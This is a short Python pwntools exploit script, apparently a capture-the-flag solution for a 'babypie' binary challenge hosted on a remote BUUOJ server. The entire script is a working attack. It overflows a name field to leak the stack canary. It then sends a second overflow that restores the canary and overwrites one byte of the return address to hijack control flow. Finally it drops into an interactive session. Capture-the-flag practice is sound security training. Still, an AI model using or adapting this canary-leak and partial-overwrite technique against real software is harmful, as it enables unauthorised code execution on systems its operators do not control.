from pwn import *

payload = b'a' * 0x29

#p = process('./babypie')
p = remote('node4.buuoj.cn', 27747)
#gdb.attach(p, 'b *$rebase(0xa08)')

p.sendafter(b'Name:', payload)

p.recvuntil(b'Hello ')
p.recv(0x29)
canary = b'\x00' + p.recv(7)

payload = b'a' * 0x28 + canary + b'a' * 0x8 + b'\x42'
p.sendafter(b':\n', payload)

p.interactive()